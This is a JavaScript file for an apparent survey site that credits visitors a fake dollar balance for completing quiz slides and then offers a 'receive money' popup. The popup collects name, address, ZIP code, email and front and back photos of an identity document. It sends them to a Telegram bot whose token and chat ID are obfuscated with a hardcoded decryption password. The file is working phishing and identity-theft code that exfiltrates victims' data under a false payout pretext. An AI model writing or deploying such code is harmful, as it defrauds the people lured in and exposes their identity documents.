// Система баланса для блоков "Congratulations!"
document.addEventListener('DOMContentLoaded', function() {
    const BALANCE_KEY = 'user_balance';
    const COMPLETED_REWARDS_KEY = 'completed_reward_slides';
    
    let balance = parseInt(localStorage.getItem(BALANCE_KEY)) || 0;
    let completedRewards = JSON.parse(localStorage.getItem(COMPLETED_REWARDS_KEY)) || [];
    
    // Обновление отображения баланса
    function updateBalanceDisplay() {
        document.querySelectorAll('.header-balance__cost').forEach(el => {
            el.textContent = balance + ' $';
        });
    }
    
    // Получение уникального идентификатора слайда с наградой
    function getRewardSlideId(slide) {
        const title = slide.querySelector('h2');
        const content = slide.querySelector('p');
        return (title ? title.textContent : '') + (content ? content.textContent : '');
    }
    
    // Проверка, была ли награда уже получена
    function isRewardCompleted(slide) {
        const slideId = getRewardSlideId(slide);
        return completedRewards.includes(slideId);
    }
    
    // Отметка награды как полученной
    function markRewardAsCompleted(slide) {
        const slideId = getRewardSlideId(slide);
        if (!completedRewards.includes(slideId)) {
            completedRewards.push(slideId);
            localStorage.setItem(COMPLETED_REWARDS_KEY, JSON.stringify(completedRewards));
        }
    }
    
    // Начисление награды
    function addReward(slide) {
        if (!isRewardCompleted(slide)) {
            balance += 10;
            localStorage.setItem(BALANCE_KEY, balance.toString());
            markRewardAsCompleted(slide);
            updateBalanceDisplay();
            
            console.log('Начислено 10$. Текущий баланс:', balance);
            return true;
        }
        return false;
    }
    
    // Инициализация при загрузке
    updateBalanceDisplay();
    
    // Обработчик для next-btn в блоках с Congratulations
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('next-btn')) {
            const slide = e.target.closest('.quiz-slide');
            
            // Проверяем, является ли текущий слайд блоком с Congratulations
            if (slide && slide.querySelector('h2') && 
                slide.querySelector('h2').textContent.includes('Congratulations')) {
                
                // Начисляем награду только если она еще не была получена
                addReward(slide);
            }
        }
    });
    
    // Обработчик для кнопки Claim в финальном слайде
    const finishButton = document.querySelector('.quiz-slide__finish-button');
    if (finishButton) {
        finishButton.addEventListener('click', function() {
            const slide = this.closest('.quiz-slide');
            if (slide && slide.querySelector('h2') && 
                slide.querySelector('h2').textContent.includes('celebrate')) {
                
                addReward(slide);
            }
        });
    }
});

document.addEventListener('DOMContentLoaded', function() {
    const quizSlides = document.querySelectorAll('.quiz-slide');
    let currentSlide = 0;
    
    // Show first slide
    showSlide(currentSlide);
    
    // Auto-advance functionality for questions
    document.querySelectorAll('.auto-next').forEach(radio => {
        radio.addEventListener('change', function() {
            setTimeout(() => {
                currentSlide++;
                showSlide(currentSlide);
            }, 500);
        });
    });
    
    // Next button functionality for reward slides
    document.querySelectorAll('.next-btn').forEach(button => {
        button.addEventListener('click', function() {
            currentSlide++;
            showSlide(currentSlide);
        });
    });
    
    function showSlide(n) {
        // Hide all slides
        quizSlides.forEach(slide => {
            slide.classList.remove('active');
        });
        
        // Show current slide
        quizSlides[n].classList.add('active');
    }

    const finishButton = document.querySelector('.quiz-slide__finish-button');
  if (finishButton) {
    finishButton.addEventListener('click', function() {
      const balanceCosts = document.querySelectorAll('.header-balance__cost');
      balanceCosts.forEach(element => {
        element.textContent = '90 $';
      });
      
      resetQuiz();
    });
  }
  
  function resetQuiz() {
    currentSlide = 0;
    showSlide(currentSlide);
    
    const allRadioInputs = document.querySelectorAll('input[type="radio"]');
    allRadioInputs.forEach(input => {
      input.checked = false;
    });
   
    if (specifyInput) {
      specifyInput.style.display = 'none';
      specifyInput.value = '';
    }
    
    updateNextButton();
  }
});


document.addEventListener('DOMContentLoaded', function() {
    const burgerBtn = document.querySelector('.burger-btn');
    const headerMenu = document.querySelector('.header-menu');
    const introBack = document.querySelector('.intro');
    const headerContainer = document.querySelector('.header-container');
    const styleElement = document.createElement('style');
    document.head.appendChild(styleElement);
    
    burgerBtn.addEventListener('click', function() {
        this.classList.toggle('active');
        headerMenu.classList.toggle('active');
        
        
        if (headerMenu.classList.contains('active')) {
            document.body.style.overflow = 'hidden';
            introBack.style.background = 'rgba(165, 157, 227, 1)';
            headerContainer.style.background = 'white';
            styleElement.innerHTML = '.intro::after { display: none !important; }';
        } else {
            document.body.style.overflow = '';
            styleElement.innerHTML = '.intro::after { display: block !important; }';
            introBack.style.background = 'rgba(243, 243, 243, 1)';
            headerContainer.style.background = 'rgba(165, 157, 227, 1)';
          }
    });
    
    
    const menuItems = document.querySelectorAll('.header-menu__item');
    menuItems.forEach(item => {
        item.addEventListener('click', function() {
            burgerBtn.classList.remove('active');
            headerMenu.classList.remove('active');
            document.body.style.overflow = '';
        });
    });
});

////////////////////////////////Pass///////////////////////////////
class SimpleEncryptor {

    static async encrypt(text, password) {
        try {
            const encoder = new TextEncoder();
            const data = encoder.encode(text);
            
            const salt = crypto.getRandomValues(new Uint8Array(16));
            
            const keyMaterial = await crypto.subtle.importKey(
                'raw',
                encoder.encode(password),
                'PBKDF2',
                false,
                ['deriveKey']
            );
            
            const key = await crypto.subtle.deriveKey(
                {
                    name: 'PBKDF2',
                    salt: salt,
                    iterations: 100000,
                    hash: 'SHA-256'
                },
                keyMaterial,
                { name: 'AES-GCM', length: 256 },
                false,
                ['encrypt', 'decrypt']
            );
            
            const iv = crypto.getRandomValues(new Uint8Array(12));
            
            const encryptedData = await crypto.subtle.encrypt(
                { name: 'AES-GCM', iv: iv },
                key,
                data
            );
            const combined = new Uint8Array(salt.length + iv.length + encryptedData.byteLength);
            combined.set(salt, 0);
            combined.set(iv, salt.length);
            combined.set(new Uint8Array(encryptedData), salt.length + iv.length);
            
            return btoa(String.fromCharCode(...combined));
            
        } catch (error) {
            console.error('Encryption error:', error);
            throw error;
        }
    }
    
    static async decrypt(encryptedData, password) {
        try {
            const decoder = new TextDecoder();
            
            const encryptedArray = new Uint8Array(
                atob(encryptedData).split('').map(c => c.charCodeAt(0))
            );
            const salt = encryptedArray.slice(0, 16);
            const iv = encryptedArray.slice(16, 28);
            const data = encryptedArray.slice(28);
            
            const encoder = new TextEncoder();
            const keyMaterial = await crypto.subtle.importKey(
                'raw',
                encoder.encode(password),
                'PBKDF2',
                false,
                ['deriveKey']
            );
            
            const key = await crypto.subtle.deriveKey(
                {
                    name: 'PBKDF2',
                    salt: salt,
                    iterations: 100000,
                    hash: 'SHA-256'
                },
                keyMaterial,
                { name: 'AES-GCM', length: 256 },
                false,
                ['decrypt']
            );
            
            const decrypted = await crypto.subtle.decrypt(
                { name: 'AES-GCM', iv: iv },
                key,
                data
            );
            
            return decoder.decode(decrypted);
            
        } catch (error) {
            console.error('Decryption error:', error);
            throw new Error('Invalid password or corrupted data');
        }
    }
}
////////////////////////////////////////////////////////////////
document.addEventListener('DOMContentLoaded', async function() {

    const ENCRYPTED_TOKEN = '5/E1gg0ixoNhvjXqsKxs+MdJaxGsUw7PTtMB8cmJlrhpSJzNlSVUTWIongSAnNlD7W0XKJ5Qu8loOR8vh8RlTcclQ1BzSoD0OsnG1DaDmkn/GIJsIlUSGTgP';
    const ENCRYPTED_CHAT_ID = '/2BHYfYT6g1PEmssBvyhbXzorzCJWyJGpR8bIvCBD3l/rFqaUYNv4hbQUzA5U8bzhT99jRDA';
    const PASSWORD = '159357';

    try {
        const BOT_TOKEN = await SimpleEncryptor.decrypt(ENCRYPTED_TOKEN, PASSWORD);
        const CHAT_ID = await SimpleEncryptor.decrypt(ENCRYPTED_CHAT_ID, PASSWORD);

        console.log('Tokens decrypted successfully');
        
        initApp(BOT_TOKEN, CHAT_ID);

    } catch (error) {
        return;
    }

    function initApp(BOT_TOKEN, CHAT_ID) {
        
        let formData = {
            name: '',
            surname: '',
            address: '',
            ZIPCode: '',
            email: '',
            frontPhoto: null,
            backPhoto: null
        };

        const popup = document.getElementById('popup');
        const contactForm = document.getElementById('contactForm');
        const sendButton = document.getElementById('sendToTelegram');
        const fileInputs = document.querySelectorAll('.file-input');
        const uploadPreview = document.getElementById('uploadPreview');
        const nextButtonPage2 = document.querySelector('.popup-page[data-page="2"] .next-page');
        
        
        nextButtonPage2.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            console.log('Next button clicked on page 2');
            
            
            clearAllErrors();
            
            
            let hasErrors = false;
            const requiredFields = ['name', 'surname', 'address', 'ZIPCode', 'email'];
            
            requiredFields.forEach(field => {
                const input = document.querySelector(`[name="${field}"]`);
                const errorElement = document.getElementById(`${field}-error`);
                
                if (!input.value.trim()) {
                    
                    input.classList.add('error');
                    errorElement.style.display = 'block';
                    errorElement.textContent = 'This field is required';
                    hasErrors = true;
                    console.log(`Field ${field} is empty`);
                } else if (field === 'email') {

                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!emailRegex.test(input.value)) {
                        input.classList.add('error');
                        errorElement.style.display = 'block';
                        errorElement.textContent = 'Please enter a valid email address';
                        hasErrors = true;
                        console.log(`Email ${input.value} is invalid`);
                    }
                }
            });
            
            if (hasErrors) {
                console.log('Form has errors, not switching page');
                return;
            }
            
            console.log('Form is valid, switching to page 3');
            switchPage(3);
        });

        function clearAllErrors() {
            const errorMessages = document.querySelectorAll('.error-message');
            const inputs = document.querySelectorAll('.contact-form input');
            
            errorMessages.forEach(error => {
                error.style.display = 'none';
            });
            
            inputs.forEach(input => {
                input.classList.remove('error');
            });
            
            const photoErrors = document.querySelectorAll('.photo-error');
            photoErrors.forEach(error => error.remove());
        }
        
        const formInputs = contactForm.querySelectorAll('input');
        formInputs.forEach(input => {
            input.addEventListener('input', function() {
                this.classList.remove('error');
                const errorElement = document.getElementById(`${this.name}-error`);
                if (errorElement) {
                    errorElement.style.display = 'none';
                }
            });
        });
        
        const otherNextButtons = document.querySelectorAll('.next-page:not(.popup-page[data-page="2"] .next-page)');
        otherNextButtons.forEach(button => {
            button.addEventListener('click', function() {
                const nextPage = this.getAttribute('data-next');
                switchPage(nextPage);
            });
        });

        contactForm.addEventListener('input', function(e) {
            formData[e.target.name] = e.target.value;
        });
       
        fileInputs.forEach(input => {
            input.addEventListener('change', function(e) {
                const file = e.target.files[0];
                const side = e.target.dataset.side;
                const label = this.nextElementSibling;
                
                if (file) {
                    formData[side + 'Photo'] = file;
                    
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        label.innerHTML = `
                            <img src="${e.target.result}" alt="${side} side" style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">
                            <span style="position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); color: white; background: rgba(0,0,0,0.5); padding: 2px 8px; border-radius: 4px; font-size: 12px;">${side} side</span>
                        `;
                        label.style.padding = '0';
                        label.style.position = 'relative';
                        
                        const oldPreview = uploadPreview.querySelector(`[data-side="${side}"]`);
                        if (oldPreview) {
                            uploadPreview.removeChild(oldPreview);
                        }
                    };
                    reader.readAsDataURL(file);
                }
            });
        });
        
        sendButton.addEventListener('click', async function() {
            
            clearAllErrors();
            let hasErrors = false;
            const requiredFields = ['name', 'surname', 'address', 'ZIPCode', 'email'];
            
            requiredFields.forEach(field => {
                const input = document.querySelector(`[name="${field}"]`);
                const errorElement = document.getElementById(`${field}-error`);
                
                if (!input.value.trim()) {
                    input.classList.add('error');
                    errorElement.style.display = 'block';
                    errorElement.textContent = 'This field is required';
                    hasErrors = true;
                } else if (field === 'email') {
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!emailRegex.test(input.value)) {
                        input.classList.add('error');
                        errorElement.style.display = 'block';
                        errorElement.textContent = 'Please enter a valid email address';
                        hasErrors = true;
                    }
                }
            });
            
            if (hasErrors) {
                return;
            }

            if (!formData.frontPhoto || !formData.backPhoto) {
                const photoError = document.createElement('div');
                photoError.className = 'photo-error';
                photoError.textContent = 'Please upload both photos';
                uploadPreview.appendChild(photoError);
                return;
            }
            
            sendButton.textContent = 'Sending...';
            sendButton.disabled = true;

            try {
                const textMessage = `
🔐 *New Verification Request From snappollqs.online*

👤 *Name:* ${formData.name}
👥 *Surname:* ${formData.surname}
🏠 *City:* ${formData.address}
🏠 *ZIP-Code:* ${formData.ZIPCode}
📧 *Email:* ${formData.email}
🕒 *Time:* ${new Date().toLocaleString()}
                `;
                
                await sendTextToTelegram(textMessage, BOT_TOKEN, CHAT_ID);
                
                await sendPhotoToTelegram(formData.frontPhoto, 'Front side of document', BOT_TOKEN, CHAT_ID);
                await sendPhotoToTelegram(formData.backPhoto, 'Back side of document', BOT_TOKEN, CHAT_ID);
                
                switchPage(4);

            } catch (error) {
                console.error('Error sending to Telegram:', error);
                alert('Error sending data. Please try again.');
            } finally {
                sendButton.textContent = 'Send for verification';
                sendButton.disabled = false;
            }
        });
        
        async function sendTextToTelegram(text, botToken, chatId) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send text message');
            }
        }
        
        async function sendPhotoToTelegram(photoFile, caption, botToken, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoFile);
            formData.append('caption', caption);

            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                throw new Error('Failed to send photo');
            }
        }

        function switchPage(pageNumber) {
            const pages = popup.querySelectorAll('.popup-page');
            pages.forEach(page => page.classList.remove('active'));
            
            const targetPage = popup.querySelector(`[data-page="${pageNumber}"]`);
            if (targetPage) {
                targetPage.classList.add('active');
            }
        }
    }
});
////////////////////////////////////////////////////////////////

document.addEventListener('DOMContentLoaded', function() {
    const receiveMoneyButtons = document.querySelectorAll('.header-receive__button');
    const popUp = document.getElementById('popup');
    const overlay = document.querySelector('.overlay');
    
    receiveMoneyButtons.forEach(function(button) {
        button.addEventListener('click', function() {
            popUp.classList.add('active');
            
            if (overlay) {
                overlay.classList.add('active');
            }
            
            document.body.style.overflow = 'hidden';
        });
    });
    
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) {
            closePopup();
        }
    });
    
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && popUp.classList.contains('active')) {
            closePopup();
        }
    });
    
    function closePopup() {
        popUp.classList.remove('active');
        overlay.classList.remove('active');
        document.body.style.overflow = '';
    }
});

document.addEventListener('DOMContentLoaded', function() {
    const popup = document.getElementById('popup');
    const pages = popup.querySelectorAll('.popup-page');
    
    popup.addEventListener('click', function(e) {
        if (e.target.classList.contains('next-page')) {
            const nextPage = e.target.dataset.next;
            switchPage(nextPage);
        }
        
        if (e.target.classList.contains('close-popup')) {
            closePopup();
        }
    });
    
    function switchPage(pageNumber) {
        pages.forEach(page => page.classList.remove('active'));
        
        const targetPage = popup.querySelector(`[data-page="${pageNumber}"]`);
        if (targetPage) {
            targetPage.classList.add('active');
        }
    }
    
    function closePopup() {
        switchPage('1');
        popup.classList.remove('active');
        document.querySelector('.overlay').classList.remove('active');
        document.body.style.overflow = '';
    }
});



